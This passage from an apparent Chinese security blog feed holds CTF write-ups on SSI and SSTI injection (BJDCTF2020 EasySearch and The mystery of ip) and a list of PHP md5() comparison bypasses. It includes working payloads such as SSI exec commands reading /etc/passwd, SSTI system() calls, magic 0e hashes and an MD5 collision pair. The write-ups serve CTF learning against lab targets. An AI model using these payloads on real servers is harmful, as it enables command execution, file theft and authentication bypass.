    <content type="html"><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script><h3 id="一-SSI漏洞解析"><a href="#一-SSI漏洞解析" class="headerlink" title="一.SSI漏洞解析"></a>一.SSI漏洞解析</h3><h4 id="1-原理"><a href="#1-原理" class="headerlink" title="1.原理"></a>1.原理</h4><p>现在大多数Web服务很少用到SSI，但是还是有有必要了解一下。<br><strong>SSI全称是Server Side Includes，即服务器端包含，是一种基于服务器端的网页制作技术。</strong></p><p><strong>SSI是嵌入HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。</strong></p><p><strong>基本原理就是：SSI在HTML文件中，可以通过注释行调用命令或指针，即允许通过在HTML页面注入脚本或远程执行任意代码。</strong></p><p>SSI漏洞存在于shtml，stm，shtm文件中，就是应用ssi技术的html文件，当我在这个页面加入ssi指令后，服务器开始解析，将文件图片包含或者远程执行命令。</p><hr><h4 id="2-开启ssi"><a href="#2-开启ssi" class="headerlink" title="2.开启ssi"></a>2.开启ssi</h4><h5 id="1-Nginx"><a href="#1-Nginx" class="headerlink" title="(1)Nginx"></a>(1)Nginx</h5><p>在配置文件中添加如下几项：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssi on;</span><br><span class="line">ssi_silent_errors off;</span><br><span class="line">ssi_types text&#x2F;shtml;</span><br></pre></td></tr></table></figure><h5 id="2-Apache"><a href="#2-Apache" class="headerlink" title="(2)Apache"></a>(2)Apache</h5><p>修改Apache配置文件httpd.conf：</p><ul><li><p>确认加载include.so模块，将注释去掉：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LoadModule include_module libexec&#x2F;apache2&#x2F;mod_include.so</span><br></pre></td></tr></table></figure></li><li><p>AddType部分去掉这两段注释：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">AddType text&#x2F;html .shtml</span><br><span class="line">AddOutputFilter INCLUDES .shtml</span><br></pre></td></tr></table></figure></li><li><p>Directory目录权限里面找到Options Indexes FollowSymLinks，并增加Includes修改为Options Indexes FollowSymLinks Includes；</p></li><li><p>重新启动Apache；</p></li></ul><hr><h4 id="3-SSI基本语法："><a href="#3-SSI基本语法：" class="headerlink" title="3.SSI基本语法："></a>3.SSI基本语法：</h4><p>其语法格式必须是以html的注释符 <strong>&lt;!–</strong> 开头、且后面紧接#符号和SSI命令，它们期间不能存在空格：</p><ul><li><p>显示服务器端环境变量 <strong>&lt;#echo&gt;</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">本文档名称：&lt;!--#echo var&#x3D;&quot;DOCUMENT_NAME&quot;--&gt;</span><br><span class="line">现在时间：&lt;!--#echo var&#x3D;&quot;DATE_LOCAL&quot;--&gt;</span><br><span class="line">显示IP地址：&lt;!--#echo var&#x3D;&quot;REMOTE_ADDR&quot;--&gt;</span><br></pre></td></tr></table></figure></li><li><p>将文本内容直接插入到文档中&lt;#include&gt;</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#include file&#x3D;&quot;文件名称&quot;--&gt;</span><br><span class="line">&lt;!--#include virtual&#x3D;&quot;index.html&quot; --&gt;</span><br><span class="line">&lt;!--#include virtual&#x3D;&quot;文件名称&quot;–&gt;</span><br><span class="line">&lt;!--#include virtual&#x3D;&quot;&#x2F;www&#x2F;footer.html&quot; --&gt;</span><br></pre></td></tr></table></figure></li></ul><p><strong>注：file包含文件可以在同一级目录或其子目录中，但不能在上一级目录中，virtual包含文件可以是Web站点上的虚拟目录的完整路径。</strong></p><ul><li>直接执行服务器上的各种程序&lt;#exec&gt;(如CGI或其他可执行程序)<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#exec cmd&#x3D;&quot;命令&quot;--&gt;</span><br><span class="line">&lt;!--#exec cmd&#x3D;&quot;cat &#x2F;etc&#x2F;passwd&quot;--&gt;</span><br><span class="line">&lt;!--#exec cgi&#x3D;&quot;文件名称&quot;--&gt;</span><br><span class="line">&lt;!--#exec cgi&#x3D;&quot;&#x2F;cgi-bin&#x2F;access_log.cgi&quot;--&gt;</span><br></pre></td></tr></table></figure></li></ul><hr><h4 id="4-SSI注入漏洞"><a href="#4-SSI注入漏洞" class="headerlink" title="4.SSI注入漏洞"></a>4.SSI注入漏洞</h4><h5 id="1-如何利用"><a href="#1-如何利用" class="headerlink" title="(1)如何利用"></a>(1)如何利用</h5><p><strong>简单点说就是攻击者可以通过外部输入SSI标签到Web页面（stm、shtm、shtml文件）来动态执行代码。<br>SSI注入允许远程在Web应用中注入脚本来执行代码。<br>简单点说就是攻击者可以通过外部输入SSI语句到Web页面来动态执行代码。</strong></p><p><strong>一般地，在stm、shtm、shtml等文件中，存在XSS的页面，大概率是存在SSI注入漏洞的。<br>也就是说，用户输入的内容会显示在页面中的场景。<br>比如，一个存在反射型XSS漏洞的页面，如果输入的payload不是XSS代码而是SSI的标签，同时服务器又开启了对SSI的支持的话就会存在SSI注入漏洞。</strong></p><hr><h5 id="2-前提条件"><a href="#2-前提条件" class="headerlink" title="(2)前提条件"></a>(2)前提条件</h5><p>攻击者要想进行SSI注入、在Web服务器上运行任意命令，需要满足下列几点前提条件才能成功：<strong>Web服务器支持并开启了SSI；<br>Web应用程序在返回HTML页面时，嵌入了用户输入的内容；<br>外部输入的参数值未进行有效的过滤；</strong></p><hr><p><a href="https://www.mi1k7ea.com/2019/09/28/SSI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">参考博客</a><br>例题：BUUCTF [BJDCTF2020]EasySearch，BWAPP靶场的SSI注入漏洞。</p><hr><h3 id="二-SSTI漏洞"><a href="#二-SSTI漏洞" class="headerlink" title="二.SSTI漏洞"></a>二.SSTI漏洞</h3><h4 id="1-原理-1"><a href="#1-原理-1" class="headerlink" title="(1)原理"></a>(1)原理</h4><p>服务端模板注入是服务端接收了用户的输入，将其作为 Web 应用模板内容的一部分，在进行目标编译渲染的过程中，执行了用户插入的恶意内容，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。</p><hr><h4 id="2-利用"><a href="#2-利用" class="headerlink" title="(2)利用"></a>(2)利用</h4><p> 检测方法如下：</p><img src="/2-12-%E6%B5%85%E8%B0%88SSI%E5%92%8CSSTI%E6%BC%8F%E6%B4%9E/1.png" class title="Da4er"><p> 当我们输入的内容，经过web模板解析后返回到html页面中，如果在web模板解析时没有进行很好的过滤就会出现SSTI模板注入漏洞。</p><p>以BUU上[护网杯 2018]easy_tornado为例，当我们的filname和filehash不一样的时候会跳转到error页面。</p><img src="/2-12-%E6%B5%85%E8%B0%88SSI%E5%92%8CSSTI%E6%BC%8F%E6%B4%9E/2.png" class title="Da4er"><img src="/2-12-%E6%B5%85%E8%B0%88SSI%E5%92%8CSSTI%E6%BC%8F%E6%B4%9E/3.png" class title="Da4er"><p> 当我们输入2不会返回正常的1 * 2而是ORZ</p><img src="/2-12-%E6%B5%85%E8%B0%88SSI%E5%92%8CSSTI%E6%BC%8F%E6%B4%9E/4.png" class title="Da4er"><p> 证明存在SSTI漏洞<br> 使用python web模板tornado中的handler.settings可以把cookie输出</p><img src="/2-12-%E6%B5%85%E8%B0%88SSI%E5%92%8CSSTI%E6%BC%8F%E6%B4%9E/5.png" class title="Da4er"><p> 这就可以证明有SSTI模板漏洞，这个漏洞在很多语言的web模板中都存在，不光只有python，因为python tornado模板使用简单，所以造成的危害更大些。</p><p> 也可以使用system函数执行系统命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;system(&#39;命令&#39;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>例题：[BJDCTF2020]The mystery of ip<br>题目X-Forwarded-For可控，存在模板注入，可以使用system执行系统命令。<br>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For &#123;&#123;system(&#39;cat &#x2F;flag&#39;)&#125;&#125;</span><br></pre></td></tr></table></figure><img src="/2-12-%E6%B5%85%E8%B0%88SSI%E5%92%8CSSTI%E6%BC%8F%E6%B4%9E/6.png" class title="Da4er">]]></content>
    
    <summary type="html">
    
      
      
        &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;
&lt;h3 id=&quot;一-SSI漏洞解析&quot;&gt;&lt;a href=&quot;#一-SSI漏洞解析&quot; class=&quot;headerlink&quot; title=&quot;一.SSI漏洞解析&quot;&gt;&lt;
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2.12 [BJDCTF2020]EasySearch&amp;The mystery of ip</title>
    <link href="https://da4er.top/2-12-BJDCTF2020-EasySearch-The-mystery-of-ip.html"/>
    <id>https://da4er.top/2-12-BJDCTF2020-EasySearch-The-mystery-of-ip.html</id>
    <published>2020-02-12T08:18:45.000Z</published>
    <updated>2020-02-12T08:20:32.913Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script><h3 id="EasySearch"><a href="#EasySearch" class="headerlink" title="EasySearch"></a>EasySearch</h3><p>打开题目先随便输入，发现会弹框。在扫描一下目录，发现.swp备份文件。</p><img src="/2-12-BJDCTF2020-EasySearch-The-mystery-of-ip/1.png" class title="Da4er"><p>打开index.php.swp页面：</p><img src="/2-12-BJDCTF2020-EasySearch-The-mystery-of-ip/2.png" class title="Da4er"><p>阅读这段源码：<strong>首先是随机获取文件名的一个函数，最关键的是让password前6个字符的md5加密值等于6d0bc1，然后会在public目录下创建一个shtml文件，再将post传参的username字段写入这个shtml文件中。</strong><br>首先写个脚本让password前6个字符的md5值等于6d0bc1：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">a&#x3D; &quot;0123456789&quot;</span><br><span class="line">for o in a:</span><br><span class="line">    for p in a:</span><br><span class="line">        for q in a:</span><br><span class="line">            for r in a:</span><br><span class="line">                for s in a:</span><br><span class="line">                    for t in a:</span><br><span class="line">                        for u in a:</span><br><span class="line">                            b &#x3D; str(o)+str(p)+str(q)+str(r)+str(s)+str(t)+str(u)</span><br><span class="line">                            md5 &#x3D; hashlib.md5(b.encode(&#39;utf-8&#39;)).hexdigest()</span><br><span class="line">                            if ((md5[0:6])&#x3D;&#x3D;&#39;6d0bc1&#39;):</span><br><span class="line">                                print b</span><br></pre></td></tr></table></figure><p>可以爆破出很多，我拿<strong>2020666来进行传参。</strong></p><img src="/2-12-BJDCTF2020-EasySearch-The-mystery-of-ip/3.png" class title="Da4er"><p>成功利用，然后就是访问这个新建的shtml文件了，<strong>抓包发现在响应包中有这个文件的路径</strong>：</p><img src="/2-12-BJDCTF2020-EasySearch-The-mystery-of-ip/4.png" class title="Da4er"><img src="/2-12-BJDCTF2020-EasySearch-The-mystery-of-ip/5.png" class title="Da4er"><p>到这利用了SSI注入漏洞，所以我们可以在username变量中传入ssi语句来远程执行系统命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#exec cmd&#x3D;&quot;命令&quot;--&gt;</span><br></pre></td></tr></table></figure><p>首先ls一下当前目录：</p><img src="/2-12-BJDCTF2020-EasySearch-The-mystery-of-ip/6.png" class title="Da4er"><p>发现成功利用，没有进行任何过滤。<br>然后我们在ls一下上一级目录：</p><img src="/2-12-BJDCTF2020-EasySearch-The-mystery-of-ip/7.png" class title="Da4er"><p>发现了 <strong>‘flag_990c66bf85a09c664f0b6741840499b2’</strong> 文件，最后我们把这个文件cat出来，遍得到flag。</p><img src="/2-12-BJDCTF2020-EasySearch-The-mystery-of-ip/8.png" class title="Da4er"><hr><h3 id="The-mystery-of-ip"><a href="#The-mystery-of-ip" class="headerlink" title="The mystery of ip"></a>The mystery of ip</h3><p>这道题我在做的时候试了好多方法，虽然扫描目录的时候发现了.ds_store文件但是没有权限。这个思路行不通，最后还是看了别的师傅的博客，原来是X-Forwarded-For参数可控，使用的是ssti模板注入2333….<br>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For:&#123;&#123;system(&#39;cat .&#x2F;flag&#39;)&#125;&#125;</span><br></pre></td></tr></table></figure><img src="/2-12-BJDCTF2020-EasySearch-The-mystery-of-ip/9.png" class title="Da4er">]]></content>
    
    <summary type="html">
    
      
      
        &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;
&lt;h3 id=&quot;EasySearch&quot;&gt;&lt;a href=&quot;#EasySearch&quot; class=&quot;headerlink&quot; title=&quot;EasySearch
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>PHP中的md5()函数绕过总结</title>
    <link href="https://da4er.top/PHP%E4%B8%AD%E7%9A%84md5-%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93.html"/>
    <id>https://da4er.top/PHP%E4%B8%AD%E7%9A%84md5-%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93.html</id>
    <published>2020-02-11T11:52:15.000Z</published>
    <updated>2020-02-11T11:52:53.312Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script><h3 id="一-前言"><a href="#一-前言" class="headerlink" title="一.前言"></a>一.前言</h3><p>本篇文章记录一下在做ctf题时遇到到的md5()绕过方法。主要分为:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">md5(key,true)；</span><br><span class="line">md5()&#x3D;&#x3D;md5()；</span><br><span class="line">md5()&#x3D;&#x3D;&#x3D;md5()；</span><br><span class="line">(string)key1!&#x3D;&#x3D;(string)key2&amp;&amp;md5(key1)&#x3D;&#x3D;&#x3D;md5(key2)</span><br></pre></td></tr></table></figure><p>绕过思路。</p><hr><h3 id="二-具体方法"><a href="#二-具体方法" class="headerlink" title="二.具体方法"></a>二.具体方法</h3><h4 id="1-MD5-key-true"><a href="#1-MD5-key-true" class="headerlink" title="1. MD5(key,true)"></a>1. MD5(key,true)</h4><p>默认md5第二个参数是false。<br>FALSE - 默认 32 字符十六进制数<br>TRUE -  原始 16 字符二进制格式<br>所以当我们传入一些特殊字符后会在浏览器中显示一些关键字，从而实现绕过。<br>两个特殊的字符：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ffifdyop</span><br><span class="line">129581926211651571912466741651878684928</span><br><span class="line">ffifdyop：T0Do#&#39;or&#39;8</span><br><span class="line">129581926211651571912466741651878684928：&#39;or&#39;6]!r,b。</span><br></pre></td></tr></table></figure><p>一般传入ffifdyop即可绕过。</p><h4 id="2-md5-md5"><a href="#2-md5-md5" class="headerlink" title="2.md5()==md5()"></a>2.md5()==md5()</h4><p>这个主要用到弱类型比较，以科学计数法0e开头的，在比较时会自动转换成0从而绕过比较。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line"></span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line"></span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line"></span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s1184209335a</span><br><span class="line">0e072485820392773389523109082030</span><br><span class="line"></span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line"></span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line"></span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line"></span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line"></span><br><span class="line">s532378020a</span><br><span class="line">0e220463095855511507588041205815</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line"></span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line"></span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line"></span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line"></span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br></pre></td></tr></table></figure><p>以上就是一些常用的绕过参数，随便找两个传进去就可以绕过。</p><h4 id="3-md5-md5"><a href="#3-md5-md5" class="headerlink" title="3.md5()===md5()"></a>3.md5()===md5()</h4><p>===强制类型比较，当比较时会比较类型和大小，所以用第二种绕过不了。<br>但是我们可以用数组绕过，当我们传入不符合规定的参数时：md5([1])==md5([2])==error，即error==error从而绕过。</p><h4 id="4-string-key1-string-key2-amp-amp-md5-key1-md5-key2"><a href="#4-string-key1-string-key2-amp-amp-md5-key1-md5-key2" class="headerlink" title="4.(string)key1!==(string)key2&amp;&amp;md5(key1)===md5(key2)"></a>4.(string)key1!==(string)key2&amp;&amp;md5(key1)===md5(key2)</h4><p>这个在比较时强制类型转换成string类型，所以第三种就不可以了。<br>但是这个要求我们传入md5相同但是字符串不相同的两个参数，其实这样的情况是存在的。<br>两条payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Param1&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line">Param2&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure><p>上面的payload就可以绕过，当然还有很多这样的字符串。<br>注意一下的是在post传参时要urlencode一下。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;
&lt;h3 id=&quot;一-前言&quot;&gt;&lt;a href=&quot;#一-前言&quot; class=&quot;headerlink&quot; title=&quot;一.前言&quot;&gt;&lt;/a&gt;一.前言&lt;/h3&gt;&lt;p&gt;
      
    
    </summary>
    
    
      <category term="代码审计" scheme="https://da4er.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="代码审计" scheme="https://da4er.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
</feed>
